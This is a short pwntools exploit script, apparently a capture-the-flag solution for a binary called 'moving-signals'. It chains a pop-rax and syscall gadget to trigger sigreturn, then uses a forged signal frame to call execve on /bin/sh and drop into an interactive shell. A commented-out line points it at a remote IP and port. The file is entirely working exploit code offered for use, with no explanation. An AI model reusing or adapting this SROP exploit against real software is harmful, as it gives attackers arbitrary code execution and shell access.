from pwn import *

context.clear(arch="amd64")	
p=process('./moving-signals')
#p=remote('185.172.165.118',2525)
raw_input("DEBUG")
	
pop_rax = 0x0000000000041018
syscall = 0x0000000000041015




payload = "A"*8
payload += p64(pop_rax)
payload += p64(0xf)
payload += p64(syscall)

frame = SigreturnFrame(kernel="amd64")
frame.rax = 0x3b # execve syscall number
frame.rdi = 0x41250 # address of /bin/sh string
frame.rip = 0x0000000000041015 # syscall gadget

payload += str(frame)
print"payload: ", payload.encode('hex')

p.sendline(payload)

p.interactive()
